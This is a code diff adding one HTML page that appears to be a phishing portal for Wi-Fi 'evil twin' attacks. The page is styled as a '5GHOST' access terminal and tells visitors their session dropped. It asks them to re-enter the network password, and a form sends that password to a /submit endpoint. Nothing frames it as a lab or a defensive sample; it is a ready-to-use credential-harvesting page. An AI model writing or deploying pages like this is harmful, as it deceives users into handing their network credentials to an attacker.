@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Access Terminal</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:"SF Mono",Menlo,Consolas,monospace;background:#000;color:#33ff66;
+ min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;
+ text-shadow:0 0 6px #33ff66}
+.term{width:100%;max-width:380px;border:1px solid #1c5c2e;border-radius:6px;padding:22px;
+ background:rgba(20,45,28,.4)}
+.bar{font-size:11px;color:#1f9c47;border-bottom:1px solid #1c5c2e;padding-bottom:8px;
+ margin-bottom:14px;letter-spacing:.5px}
+h1{font-size:16px;font-weight:700;margin-bottom:4px}
+p{font-size:12px;color:#2cd957;line-height:1.6;margin-bottom:16px}
+.blink{animation:b 1s steps(1) infinite}
+@keyframes b{50%{opacity:0}}
+label{display:block;font-size:11px;margin-bottom:6px;letter-spacing:.5px}
+input{width:100%;padding:11px;font-size:14px;font-family:inherit;background:#001a08;
+ border:1px solid #1c5c2e;border-radius:4px;color:#33ff66;outline:none}
+input:focus{border-color:#33ff66}
+button{width:100%;margin-top:14px;padding:12px;font-size:14px;font-family:inherit;font-weight:700;
+ letter-spacing:1px;background:#0c3318;color:#33ff66;border:1px solid #33ff66;border-radius:4px;cursor:pointer}
+button:hover{background:#33ff66;color:#000}
+</style>
+</head>
+<body>
+<div class="term">
+<div class="bar">5GHOST // WIFI ACCESS TERMINAL v2.0</div>
+<h1>&gt; AUTHENTICATION REQUIRED</h1>
+<p>Session dropped. Re-key the network credential to restore the uplink.<span class="blink">_</span></p>
+<form action="/submit" method="get">
+<label for="password">PASSWORD:</label>
+<input type="password" id="password" name="password" minlength="8" placeholder="********" required autofocus>
+<button type="submit">[ AUTHENTICATE ]</button>
+</form>
+</div>
+</body>
+</html>
